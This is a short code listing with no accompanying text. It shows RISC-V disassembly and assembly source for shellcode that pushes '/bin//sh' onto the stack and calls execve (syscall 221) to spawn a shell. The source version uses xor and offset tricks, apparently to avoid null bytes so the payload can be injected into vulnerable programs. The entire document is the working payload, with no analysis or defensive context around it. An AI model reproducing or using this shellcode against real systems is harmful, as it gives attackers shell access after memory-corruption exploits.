#10078:	6e696537          	lui	a0,0x6e696
#1007c:	22f5051b          	addiw	a0,a0,559
#10080:	ff810113          	addi	sp,sp,-8
#10084:	00a13023          	sd	a0,0(sp) < 
#10088:	00687537          	lui	a0,0x687 <
#1008c:	32f5051b          	addiw	a0,a0,815
#10090:	00a13223          	sd	a0,4(sp) <
#10094:	00010513          	mv	a0,sp <
#10098:	00000613          	li	a2,0 <
#1009c:	00000593          	li	a1,0 <
#100a0:	0dd00893          	li	a7,221 <
#100a4:	00000073          	ecall 
.section .text
.globl _start

_start:
	li a7,0x69622f2f #ib//
	addi sp,sp,-8
	sd a7,0(sp)
	li a7,0x68732f6e # hs/n 
	sd a7,4(sp)
	xor a7,a7,a7
	addi a7,sp,0x11
	xor a0,a7,a7
	addi a0,a7,-0x11
	xor a2,a7,a7
	xor a1,a7,a7
	xor a7,a7,a7
	addi a7,a7,221
	ecall
